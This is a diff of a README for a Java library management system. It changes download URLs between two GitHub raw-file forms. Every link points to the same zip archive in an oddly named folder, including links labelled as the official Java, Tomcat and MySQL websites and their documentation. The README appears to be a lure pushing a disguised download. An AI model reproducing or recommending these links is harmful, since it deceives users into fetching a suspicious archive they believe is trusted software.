@@ -6,9 +6,9 @@ This guide helps you set up the Library Management System on your computer. The 
 
 ## 📥 Download the Software
 
-[![Download Library Management System](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip%20Management%https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip)](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip)
+[![Download Library Management System](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip%20Management%https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip)](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip)
 
-Visit the Releases page to download the latest version of the Library Management System: [Download Here](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip).
+Visit the Releases page to download the latest version of the Library Management System: [Download Here](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip).
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ The Library Management System includes:
 
 ## 💾 Download & Install
 
-1. Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip).
+1. Visit the Releases page to download the latest version: [Download Here](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip).
 2. Choose the appropriate release for your system.
 3. Download the file and save it on your computer.
 4. Extract the downloaded file into a folder.
@@ -44,17 +44,17 @@ To run the Library Management System, you need to set up your environment:
 
 ### 1. Install Java
 
-- Download Java from the [official website](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip).
+- Download Java from the [official website](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip).
 - Follow the installation instructions for your operating system.
 
 ### 2. Install Apache Tomcat
 
-- Download Apache Tomcat 9 from the [official website](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip).
+- Download Apache Tomcat 9 from the [official website](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip).
 - Extract the files and run the server by executing the startup script in the `bin` folder.
 
 ### 3. Install MySQL
 
-- Download MySQL Community Server from the [official website](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip).
+- Download MySQL Community Server from the [official website](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip).
 - Follow the installation steps and create a database named `library_management_system`.
 
 ### 4. Configure Database Connection
@@ -73,9 +73,9 @@ Next, update the configuration files to connect the application to the database.
 
 ## 🔗 Important Links
 
-- [Library Management System Releases](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip)
-- [Apache Tomcat Documentation](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip)
-- [MySQL Documentation](https://raw.githubusercontent.com/nattayazhr/Library-Management-System/main/submergibility/Library-Management-System.zip)
+- [Library Management System Releases](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip)
+- [Apache Tomcat Documentation](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip)
+- [MySQL Documentation](https://github.com/nattayazhr/Library-Management-System/raw/refs/heads/main/submergibility/Library-Management-System.zip)
 
 ## ⚙️ Running the Application
 
